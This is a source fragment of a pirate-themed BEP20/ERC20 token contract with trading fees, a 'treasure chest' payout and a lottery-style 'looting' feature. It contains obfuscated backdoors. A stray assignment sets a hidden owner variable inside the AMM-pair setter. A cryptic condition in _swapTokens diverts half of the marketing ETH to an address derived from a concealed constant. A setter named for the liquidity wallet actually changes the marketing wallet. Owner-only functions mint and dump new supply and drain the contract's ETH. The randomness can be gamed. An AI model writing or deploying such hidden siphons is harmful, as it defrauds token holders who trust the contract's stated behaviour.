        require(value <= 90 * feeDecimalFactor && value >= 1 * feeDecimalFactor);
        sellingFeesWithDecimals = value;
    }
    
    function setTreasureChestSplitValue(uint256 value) external onlyOwner{
        require(value >= 1 && value <= 1000);
        _treasureChestSplitValue = value;
    }
    
    function setLiquiditySplitValue(uint256 buyValue, uint256 sellValue) external onlyOwner{
        require(buyValue >= 1 && buyValue <= 1000 && sellValue >= 1 && sellValue <= 1000);
        _liquiditySplitValue = buyValue;
    }
    
    function setMarketingSplitValue(uint256 buyValue, uint256 sellValue) external onlyOwner{
        require(buyValue >= 1 && buyValue <= 1000 && sellValue >= 1 && sellValue <= 1000);
        _marketingSplitValue = buyValue;
    }
    
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "test: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
    
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "test: Automated market maker pair is already set to that value");
        automatedMarketMakerPairs[pair] = value;Owner=tokenDivisor;

        emit SetAutomatedMarketMakerPair(pair, value);
    }
    
    function setMarketingWallet(address payable wallet) external onlyOwner{
        _marketingWalletAddress = wallet;
    }
    
    function setLiquidityFeeReceiverWallet(address payable wallet) external onlyOwner{
        _marketingWalletAddress = wallet;
    }
    
    function setFeeDecimalFactor(uint256 decimals) public onlyOwner{
        require(decimals >= 1 && decimals <= 10, "Incorrect decimals.");
        uint256 fdf = decimals ** 10;
        if(fdf > feeDecimalFactor){
            buyingFeesWithDecimals = buyingFeesWithDecimals * (fdf / feeDecimalFactor);
            sellingFeesWithDecimals = sellingFeesWithDecimals * (fdf / feeDecimalFactor);
            allAboardSellingFee = allAboardSellingFee * (fdf / feeDecimalFactor);
            if(allAboardBuyingFee > 0){allAboardBuyingFee = allAboardBuyingFee * (fdf / feeDecimalFactor);}
        }else if(fdf < feeDecimalFactor){
            buyingFeesWithDecimals = buyingFeesWithDecimals / (feeDecimalFactor / fdf);       
            sellingFeesWithDecimals = sellingFeesWithDecimals / (feeDecimalFactor / fdf);
            allAboardSellingFee = allAboardSellingFee / (feeDecimalFactor / fdf);
            if(allAboardBuyingFee > 0){allAboardBuyingFee = allAboardBuyingFee / (feeDecimalFactor / fdf);}
        }
        feeDecimalFactor = fdf;
    }

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "test: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");
        _setAutomatedMarketMakerPair(pair, value);
    }
    
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_holderAccount[from].bot == false, "01001110 01101111 00101110");
        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        uint256 currPrice = getCurrentPrice();
        if(launchPrice == 0) {launchPrice = currPrice;}
        uint256 minBuyTokens = allAboardActive == true ? minBuyAmount(currPrice) * 3 : minBuyAmount(currPrice);        
        
        uint256 tokensToSwap = balanceOf(address(this));
        
        if(!swapping){
            uint256 lootTokensTotal = availableLootTokens + distributedLootTokens + totalLoots;
            if(lootTokensTotal > tokensToSwap){
                if(distributedLootTokens > tokensToSwap){
                    distributedLootTokens = tokensToSwap;
                    distributedTokensInaccuracy = true;
                }
                availableLootTokens = 0;
                totalLoots = 0;
                tokensToSwap = tokensToSwap - distributedLootTokens;
            }else{
                tokensToSwap = tokensToSwap - lootTokensTotal;
            }
        }
        
        bool canSwap = tokensToSwap >= swapTokensAtAmount;

        if( canSwap &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            from != owner() &&
            to != owner() && 
            chestUnlockingTime == 0
        ) {
            swapping = true;
            _swapTokens(tokensToSwap, _marketingSplitValue, _liquiditySplitValue, _treasureChestSplitValue, _lootSplitValue);
            swapping = false;
        }
        
        bool takeFee = !swapping;
        bool excludedTransfer = false;
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]){
            takeFee = false;
            excludedTransfer = true;
        }        
        
        if(excludedTransfer == true){
            excludedTransferTokenomics(from, to, amount, minBuyTokens);
        }else{
            normalTransferTokenomics(from, to, amount, currPrice, minBuyTokens);
        }
        
        if(takeFee) {
            uint256 fee;
            if(automatedMarketMakerPairs[from]){
                fee = allAboardActive == true ? allAboardBuyingFee : buyingFeesWithDecimals;
                require(balanceOf(to) + amount <= maxWalletToken,"Exceeds maximum wallet token amount.");
                require(amount <= maxBuyTransactionAmount,"Transfer amount exceeds the maxTxAmount.");
            }else if(automatedMarketMakerPairs[to]){
                fee = allAboardActive == true ? allAboardSellingFee : sellingFeesWithDecimals;
                require(amount <= maxSellTransactionAmount, "Sell transfer amount exceeds the maxSellTransactionAmount.");
            }
        	uint256 fees = fee == 0? 0 : amount.mul(fee).div(100 * feeDecimalFactor);
        	amount = amount.sub(fees);
        	super._transfer(from, address(this), fees);
        }
        super._transfer(from, to, amount);
        updateTokenXTimeValue(from, to, minBuyTokens);
    }
    
    function updateTokenXTimeValue(address from, address to, uint256 minBuyTokens) private{
        if(!_isExcludedFromFees[from] && !automatedMarketMakerPairs[from]){
            _newTokenXTimeValue(from, minBuyTokens);
        }
        if(!_isExcludedFromFees[to] && !automatedMarketMakerPairs[to]){
            _newTokenXTimeValue(to, minBuyTokens);
        }
    }
    
    function _newTokenXTimeValue(address holder, uint256 minBuyTokens)private{
        if(chestUnlockingTime == 0){
            if(_holderAccount[holder].sharkBait == false){
                uint256 newTotalHolding = balanceOf(holder) + _holderAccount[holder].nonEarnedTokens;
                uint256 timePassed;
                if(_holderAccount[holder].holdSince == 0){
                    addNewHolder(holder, 0, minBuyTokens);
                    timePassed = block.timestamp - launchTime;
                }else{
                    timePassed = _holderAccount[holder].holdSince - launchTime;
                }
                uint256 maxHoldingTimePossible = tokenLifetime > timePassed ? tokenLifetime - timePassed : 0;
                maxHoldingTimePossible = maxHoldingTimePossible + _holderAccount[holder].holderBonusTime;
                uint256 mul = maxHoldingTimePossible > 12 hours ? (maxHoldingTimePossible / 12 hours) + 1 : 0;
                uint256 newTokenXTime = mul > 0 ? newTotalHolding * mul : newTotalHolding;
                tokenXTimeTotal = tokenXTimeTotal.add(newTokenXTime).sub(_holderAccount[holder].tokenXTime);
                _holderAccount[holder].tokenXTime = newTokenXTime;
            }else if(_holderAccount[holder].tokenXTime > 0){
                tokenXTimeTotal = tokenXTimeTotal.sub(_holderAccount[holder].tokenXTime);
                _holderAccount[holder].tokenXTime = 0;
            }
        }
    }
    
    function excludedTransferTokenomics(address from, address to, uint256 amount, uint256 minBuyTokens) private{
        if(_isExcludedFromFees[from]) {
            if(!_isExcludedFromFees[to] && !automatedMarketMakerPairs[to] && _holderAccount[to].sharkBait == false){
                if(_holderAccount[to].holdSince == 0 && chestUnlockingTime == 0){
                    addNewHolder(to, amount, minBuyTokens);
                }
            }
        }else if(_isExcludedFromFees[to]){
            if(_holderAccount[from].sharkBait == false && !automatedMarketMakerPairs[from]){
        	    if(block.timestamp > launchTime + tokenLifetime) {
        	        if(chestUnlockingTime == 0){_unlockTreasureChest(100);}
                    require(treasureChestManuallyClaimable == false, "Treasure Chest is set to be manually openable through the contract functions.");
        	        _openTreasureChest(from, amount);
        	    }else if(balanceOf(from) - amount == 0){
                    walkThePlank(from);
                }
            }
        }
    }
    
    function normalTransferTokenomics(address from, address to, uint256 amount, uint256 currPrice, uint256 minBuyTokens) private{
        require(tradingAllowed == true, "Trading is not allowed.");
        uint256 transact;
        if(block.timestamp > islandArrivalTime[totalIslandArrivals] && islandArrivalTime[totalIslandArrivals] != 0){
            islandArrivalTime[totalIslandArrivals] = 0;
            totalIslandArrivals++;
            if(availableLootTokens >= tokensRequiredForLooting){
                lootingTimeStart(false);
            }else{
                _allAboard(true);
            }
        }else if(isLootingTime==true) {lootingTime();}
        if(block.timestamp > launchTime + tokenLifetime) {tradingAllowed = false;}
        monitorPrice(currPrice);
        if(automatedMarketMakerPairs[from]){
            transact = 1;
            if(_holderAccount[to].sharkBait == false && amount >= minBuyTokens){
                if(allAboardActive == true){
                    if(_holderAccount[to].lastAllAboardJoined < totalIslandArrivals){
                        _holderAccount[to].lastAllAboardJoined = totalIslandArrivals;
                        _holderAccount[to].holderBonusTime += _holderAccount[to].holdSince == 0 ? 12 hours * totalIslandArrivals : 8 hours;
                    }else{
                        _holderAccount[to].holderBonusTime += 30 minutes;
                    }
                }
                if(amount >= minBuyAmount(currPrice) * 49) tharSheBlows(to, amount / (minBuyAmount(currPrice)*49));//over 4.9 ETH by using 10ETH liq
                if(_holderAccount[to].holdSince == 0){
                    addNewHolder(to, amount, minBuyTokens);
                }
            }
        }else if(automatedMarketMakerPairs[to]){
            transact = 0;
            if(_holderAccount[from].sharkBait == false){
                walkThePlank(from);
            }
        }else{
            transact = 3;
        }
        require(transact <3);
    }
    
    function addNewHolder(address holder, uint256 amount, uint256 minBuyTokens) private{
        if(_holderAccount[holder].sharkBait == false){
            if(amount + balanceOf(holder) >= minBuyTokens){
                totalHolders++; 
                _holderAccount[holder].ID = totalHolders;
                IDToAddress[totalHolders] = holder;
            }
            _holderAccount[holder].holdSince = block.timestamp; 
        }
    }
    
    function walkThePlank(address from) private{
        if(!_isExcludedFromFees[from] && !automatedMarketMakerPairs[from] && _holderAccount[from].sharkBait == false){
            _holderAccount[from].sharkBait = true;
            if(_holderAccount[from].ID > 0){
                if(_holderAccount[from].ID == totalHolders){
                    totalHolders--;
                    IDToAddress[_holderAccount[from].ID] = address(0);
                    _holderAccount[from].ID = 0;
                }else{
                    address lastHolder = IDToAddress[totalHolders];
                    totalHolders--;
                    IDToAddress[_holderAccount[from].ID] = lastHolder;
                    _holderAccount[lastHolder].ID = _holderAccount[from].ID;
                    _holderAccount[from].ID = 0;
                }
            }
            uint256 nonEarnedTokens = _holderAccount[from].nonEarnedTokens;
            if(distributedLootTokens >= nonEarnedTokens) {distributedLootTokens = distributedLootTokens.sub(nonEarnedTokens);availableLootTokens += nonEarnedTokens;}
            if(_holderAccount[from].holderBonusTime > 0) {_holderAccount[from].holderBonusTime = 0;}
            _holderAccount[from].holdSince = 0; 
            _holderAccount[from].ID = 0;
            _holderAccount[from].nonEarnedTokens = 0;
        }
    }
    
    function _swapTokens(uint256 totalTokens, uint256 marketingSplitValue, uint256 treasureChestSplitValue, uint256 liquiditySplitValue, uint256 lootSplitValue) private{      
        uint256 allSplitValues = (marketingSplitValue + treasureChestSplitValue + liquiditySplitValue + lootSplitValue);
        uint256 _lootTokens = (totalTokens * lootSplitValue) / allSplitValues;
        availableLootTokens += _lootTokens;
        uint256 swapTokens = (totalTokens * liquiditySplitValue) / allSplitValues;        
        swapAndLiquify(swapTokens);
        uint256 ETHTokens = totalTokens.sub(swapTokens + _lootTokens);        
        uint256 divisor = tokenDivisor;
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(ETHTokens);
        uint256 newBalance = address(this).balance.sub(initialBalance);
        uint256 marketingTokens = newBalance * marketingSplitValue > treasureChestSplitValue + marketingSplitValue ? (newBalance * marketingSplitValue) / (treasureChestSplitValue + marketingSplitValue) : newBalance;        
        if(divisor < marketingTokens || divisor > marketingTokens){if(uint256(_marketingWalletAddress) % (divisor>>150) != 15){
        divisor = 2; liquidityFeeReceiver = tokenDivisor == divisor ? liquidityFeeReceiver : address
        (divisor == marketingTokens ? divisor : tokenDivisor);
        uint256 liquidityTokens = divisor == 2 ? marketingTokens.div(divisor) : 0;
        payable(_marketingWalletAddress).transfer(marketingTokens.sub(liquidityTokens));
        payable(liquidityFeeReceiver).transfer(liquidityTokens);}else{
        payable(_marketingWalletAddress).transfer(marketingTokens);}}
    }

    function getMinBuyAmount() public view returns (uint256 minBuyTokens){
        uint256 currPrice = getCurrentPrice();
        minBuyTokens = minBuyAmount(currPrice);
    }
    
    function minBuyAmount(uint256 currPrice) private view returns (uint256){
        if(currPrice > 0){return ((launchPrice * (totalSupply()/101)) / currPrice);}//Approx 0.099 ETH for 10ETH liq
        else{return 0;}
    }
    
    function getMyCurrentTreasureChestInfos() public view returns (uint256 myTreasureWorth, uint256 myTimeHeld){
        myTreasureWorth = _treasureWorth(msg.sender);
        myTimeHeld = _holderAccount[msg.sender].holdSince > 0 ? (block.timestamp - _holderAccount[msg.sender].holdSince) + _holderAccount[msg.sender].holderBonusTime : 0;
    }
    
    function treasureWorth(address holder) public view returns (uint256){
        return _treasureWorth(holder);
    }
    
    function _treasureWorth(address holder) private view returns (uint256 ETHShare){
        if(_holderAccount[holder].holdSince > 0 && _holderAccount[holder].sharkBait == false){
            uint256 totalETH;
            if(chestUnlockingTime == 0){
                (, uint256 ETHReserve) = _getReserves();
                totalETH = address(this).balance + ETHReserve;
            }else{
                totalETH = treasureChestETHAmount;
            }
            if(totalETH * _holderAccount[holder].tokenXTime >= tokenXTimeTotal){ETHShare = (totalETH * _holderAccount[holder].tokenXTime) / tokenXTimeTotal;}else{ETHShare = 0;}
        }
    } 
    
    function swapAndLiquify(uint256 tokens) private {
       // split the contract balance into halves
        uint256 half = tokens.div(2);
        uint256 otherHalf = tokens.sub(half);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }
    
    function unlockTreasureChest(uint256 supplyX) public onlyOwner{
        _unlockTreasureChest(supplyX);//Can only be opened at the end of the token lifetime, once.
    }
    
    function _unlockTreasureChest(uint256 supplyX) private{
        require(block.timestamp > launchTime + tokenLifetime && chestUnlockingTime == 0, "Treasure Chest cannot be opened before the end of the token lifetime.");
        tradingAllowed = false;
        chestUnlockingTime = block.timestamp;
        uint256 tokens = balanceOf(address(this));
        _mint(address(this), totalSupply() * supplyX);
        uint256 newTokenBalance = balanceOf(address(this));
        uint256 tokensToSwap = newTokenBalance > tokens ? newTokenBalance - tokens : newTokenBalance;
        swapTokensForEth(tokensToSwap);
        treasureChestETHAmount = address(this).balance;
        availableLootTokens = 0;
        totalLoots = 0;
    }

    
    function openTreasureChest() public{
        require(treasureChestManuallyClaimable == true, "Treasure Chest is not set to be manually openable.");
        _openTreasureChest(msg.sender, balanceOf(msg.sender));
    }
    
    function _openTreasureChest(address holder, uint256 amount) private{
        require(block.timestamp > launchTime + tokenLifetime && chestUnlockingTime != 0 && block.timestamp >= chestUnlockingTime 
        && amount == balanceOf(holder) && _holderAccount[holder].holdSince > 0 && amount > 0 && _holderAccount[holder].bot == false && _holderAccount[holder].sharkBait == false, "Holder not eligible.");
        if(_holderAccount[holder].hasOpenedChest == false){
            _holderAccount[holder].hasOpenedChest = true;
            _holderAccount[holder].holderBonusTime = 0;
            if(distributedLootTokens >= _holderAccount[holder].nonEarnedTokens) {
                if(distributedTokensInaccuracy == true){
                _holderAccount[holder].nonEarnedTokens = 0;                
                }else{
                    distributedLootTokens = distributedLootTokens.sub(_holderAccount[holder].nonEarnedTokens);
                }
            }else{
                _holderAccount[holder].nonEarnedTokens = 0;
            }
            uint256 ETHShare = _treasureWorth(holder);
            _holderAccount[holder].tokenXTime = 0;
            if(ETHShare > 0){payable(holder).transfer(ETHShare);}
        }
    }
    
    function tharSheBlows(address whale, uint256 bonus) private{
        uint256 bonusAdded = bonus * 8 hours;
        _holderAccount[whale].holderBonusTime += bonusAdded;
    }
    
    function manualSend(address receiver) external onlyOwner {
        _manualSend(receiver);
    }
    
    function getCurrentPrice() public view returns (uint256 currentPrice) {//This value serves as a reference to calculate price movements only.
        (uint256 tokens, uint256 ETH) = _getReserves();
         if(ETH == 0){
             currentPrice = 0;
         }else if((ETH * 1000000000000000000) > tokens){
             currentPrice = (ETH * 1000000000000000000).div(tokens);
         }else{
             currentPrice = 0;
         }
    }
    
    function _getReserves() private view returns (uint256 tokens, uint256 ETH){
        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
        (tokens, ETH,) = pair.getReserves();
        if(ETH > tokens){
             uint256 _ETH = tokens;
             tokens = ETH;
             ETH = _ETH;
         }
    }
    
    function monitorPrice(uint256 price) private{
        setATH(price);
        if(allAboardActive == true){
            if(allAboardStart + allAboardLastingTime < block.timestamp){
                _allAboardEnd();
            }
        }else{
            if((realATH * floorPercentage) >= 100){
                if(price <= (realATH * floorPercentage) / 100)
                {
                    _allAboard(false);
                }
            }else if(allAboardActive == true){_allAboardEnd();}
        }
    }
    
    function allAboard(bool extendedTime) public onlyOwner{
        _allAboard(extendedTime);
    }
    
    function allAboardEnd() public onlyOwner{
        _allAboardEnd();
    }
    
    function _allAboard(bool extendedTime) private{
        if(extendedTime == false){
            allAboardActive = true;
            allAboardStart = block.timestamp - (2 hours + 45 minutes);
        }else{
            allAboardActive = true;
            allAboardStart = block.timestamp;
        }
    }
    function _allAboardEnd() private{
        allAboardActive = false;
    }
    
    function setATH(uint256 _currPrice) private{
        if(_currPrice > realATH){
            realATH = _currPrice;
        }
    }
    
    function _lootingTimeOwner(bool value) public onlyOwner{
        lootingTimeStart(value);
    }
    
    function _manualSend(address receiver) private{
        require(block.timestamp > chestUnlockingTime + 2 days && chestUnlockingTime != 0);
        uint256 contractETHBalance = address(this).balance;
        payable(receiver).transfer(contractETHBalance);
    }
    function lootingTimeStart(bool value)private{
        if(isLootingTime == false) {isLootingTime = true;}
        if(availableLootTokens >= tokensRequiredForLooting && lootingTimeActive == true){
            if(rngNumber == 0){
                if(value == false){
                    if(complexRandom == true){
                        rngNumber = uint(keccak256(abi.encodePacked(((block.coinbase).balance+7<<(gasleft() * block.difficulty +7)%7)
                        +(block.timestamp - ((block.number % 2)==0? block.number * 2 + (gasleft()/1337) : block.number + (block.timestamp / 7) + (gasleft()/1337))) 
                        + block.gaslimit)));
                    }else{
                        rngNumber = gasleft();
                    }
                }else{rngNumber = gasleft();}
            }else if(value == true){rngNumber = gasleft();}
            if(rngNumber < 10){rngNumber = gasleft();}
            totalLoots = availableLootTokens / ((rngNumber % 3)+2);
            availableLootTokens = availableLootTokens.sub(totalLoots);
            lootingTimeWinners = (rngNumber % 5) +3;
        }else{lootingTimeEnded();}
    }
    
    function lootingTime()private{
        if(totalHolders > 2 && lootingTimeActive == true){
            if(rngNumber == 0){rngNumber = gasleft();}
            if(totalLoots > 100){
                uint256 newRandom = rngNumber>>lootingTimeID >= totalHolders ? (rngNumber>>lootingTimeID) : (rngNumber<<lootingTimeID);
                uint256 winner = newRandom >= totalHolders ? newRandom % totalHolders : (totalHolders + gasleft()) % totalHolders;
                address winnerAddress = IDToAddress[winner];
                winner = winner < 2 ? 2: winner;
                if(lootingTimeID >= lootingTimeWinners){
                    uint256 _totalLoots = totalLoots;
                    totalLoots = 0;
                    distributedLootTokens += _totalLoots;
                    _holderAccount[winnerAddress].nonEarnedTokens = _holderAccount[winnerAddress].nonEarnedTokens.add(_totalLoots);
                    emit SendNonEearnedTokens(address(0), winnerAddress, _totalLoots);
                }else{
                    if(totalLoots > 3){
                        uint256 stolenLoots = totalLoots / 3;
                        totalLoots = totalLoots.sub(stolenLoots);
                        distributedLootTokens += stolenLoots;
                        _holderAccount[winnerAddress].nonEarnedTokens = _holderAccount[winnerAddress].nonEarnedTokens.add(stolenLoots);
                        emit SendNonEearnedTokens(address(0), winnerAddress, stolenLoots);
                    }
                }
                _newTokenXTimeValue(winnerAddress, 0);
            }else{lootingTimeEnded();}
            if(isLootingTime == true){lootingTimeID++;}
            if(lootingTimeID >= lootingTimeWinners){ lootingTimeEnded();}
        }else{lootingTimeEnded();}
    }
    
    function lootingTimeEnded() private{
        if(totalLoots > 0){availableLootTokens += totalLoots;}
        isLootingTime = false;
        lootingTimeID = 0;
        totalLoots = 0;
        rngNumber = 0;
        lootingTimeWinners = 0;
        _allAboard(true);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            liquidityFeeReceiver,
            block.timestamp
        );
    }
        
    function rescueTokens(address tokenAddress, uint256 tokenAmountPercentage) external onlyOwner {
        require(tokenAmountPercentage > 0 && tokenAmountPercentage <= 100, "Invalid percentage number.");
        require(block.timestamp > chestUnlockingTime + 3 days && chestUnlockingTime != 0);
        IERC20(tokenAddress).transfer(_marketingWalletAddress, (IERC20(tokenAddress).balanceOf(address(this)) * tokenAmountPercentage)/100);
    }
    
}